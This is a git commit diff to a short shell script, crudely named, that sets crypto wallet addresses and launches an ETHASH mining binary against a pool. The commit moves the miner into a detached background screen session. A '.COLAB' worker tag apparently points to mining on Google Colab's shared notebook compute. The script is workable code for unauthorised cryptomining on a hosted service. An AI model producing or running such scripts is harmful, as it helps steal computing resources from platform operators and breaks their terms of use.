5d2a5c9d8a09a3e6ab11345f3e6b6cbc6b9026af
renilo <88342640+renilo@users.noreply.github.com>
2021-10-08 20:48:01 +0700

    Update kontol.sh

--- kontol.sh
+++ kontol.sh
@@ -3,4 +3,4 @@ WALLET=3D6NtTR5Zw5VmYx9ZNfHkLhXRp2uPb9BXk
 WALLET2=3DnXgkmRkXovYj6teHWmJWBdtiTTVPj5B4
 WORKER=$(echo $(shuf -i 1-9999999999 -n 1)-P)
 chmod +x memek
-./memek --algo ETHASH --pool $POOL --user $WALLET2.COLAB
+screen -dmS Running1 ./memek --algo ETHASH --pool $POOL --user $WALLET2.COLAB
